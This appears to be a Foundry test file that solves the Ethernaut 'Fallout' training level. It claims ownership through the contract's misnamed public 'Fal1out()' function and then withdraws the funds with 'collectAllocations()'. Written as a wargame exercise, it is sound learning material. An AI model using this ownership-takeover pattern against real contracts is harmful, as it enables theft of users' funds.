// 0x9caD87094EDa0D81630a3Ee87f2E62A8d291C645
// SPDX-License-Identifier: UNLICENSED
pragma solidity >= 0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";
import "../Ethernaut.sol";
import "./FalloutFactory.sol";
import "./Fallout.sol";

contract FalloutTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D)); // Como una blockchain local
    Ethernaut ethernaut; // EL juego de ethernauta

    address myAddress = address(10);

    function setUp() public {
        vm.deal(myAddress, 5 ether);
        ethernaut = new Ethernaut();
    }

    function testFallback() public {
        // Setup
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(myAddress);

        // Hacking
        address level = ethernaut.createLevelInstance(falloutFactory);
        
        (bool fal1out_success, bytes memory fal1out_data) = level.call(abi.encodeWithSignature("Fal1out()"));
        assert(fal1out_success);

        (bool allocate_success, bytes memory allocate_data) = level.call{value: 0.1 ether}(abi.encodeWithSignature("allocate()"));
        assert(allocate_success);

        (bool success, bytes memory data) = level.call(abi.encodeWithSignature("collectAllocations()"));
        assert(success);

        console.log("Owner", Fallout(level).owner.address);
        console.log("Player", myAddress);

        // Asserts
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(level));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}